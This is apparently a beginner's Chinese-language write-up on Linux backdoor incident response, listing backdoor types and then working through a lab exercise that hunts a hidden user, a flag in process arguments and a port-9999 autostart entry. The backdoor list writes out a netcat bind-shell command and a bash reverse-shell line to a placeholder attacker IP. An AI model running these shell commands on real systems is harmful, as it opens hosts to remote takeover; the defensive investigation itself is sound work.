# 应急响应——linux后门应急

### 后门

#### 先说说分类：

##### 1.帐号类后门：

攻击者直接创建一个新的隐藏用户，后续可以直接用该用户登入

例如

```
test:x:1001:1001::/home/test:/bin/bash
```

##### 2.shell后门

**nc监听后门** ：  `nc -lvvp 9999 -e /bin/bash`  开监听，别人来连

**反弹shell后门**  ：`bash -i >& /dev/tcp/攻击者IP/9999 0>&1`   主机主动连接

**webshell后门**

##### 3.定时任务后门/自启动后门

写在定时任务里或者开机检查文件里，自动执行反弹shell或者监听

#### 常规的排查思路：

先看有没有人进来 → 再看留下了什么可疑进程/端口/用户 → 再看怎么开机自启 → 再看有没有提权后门 → 最后看日志确认入侵路径。

说白了就是挨个查过去

<br>

### 打靶

<br>

#### 1、主机后门用户名称：

```
cat /etc/passwd
```

直接查看可以找到后门用户backdoor

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260613194433.png)

<br>

#### 2.机器里藏了和flag

直接grepu全局搜

```
grep -r "flag{" /etc /home /tmp /var/tmp /dev/shm 2>/dev/null
```

解释一下这里的 2>/dev/null 是丢弃报错信息

没找到，最后看wp发现是在进程启动参数中

```
ps aux
```

<br>

#### 3.主机排查发现9999端口是通过哪个配置文件如何开机启动的，如/etc/crontab则填写/etc/crontab

小白不懂这是什么意思，为啥要找是哪个配置文件启动

查了ai后知道，

> 黑客是将脚本写进了配置文件中，重启机器就会自动跑起来，现在是要找到那个自动程序。

```
grep -R "9999" /etc/systemd /etc/init.d /etc/rc.local /etc/crontab /etc/cron* /var/spool/cron 2>/dev/null
```

直接搜

这些文件都和开机自启动有关联

<br>

#### 4.给出使用了/bin/bash 的RCE后门进程名称+端口号

```
ps aux | grep  "/bin/bash" 
```

 这里可能会显示一个名为grep的进程，这是因为刚刚执行的grep命令也会被ps捕获

后续还有几个任务就先不深入了，不然要理解的东西有点多了，点到为止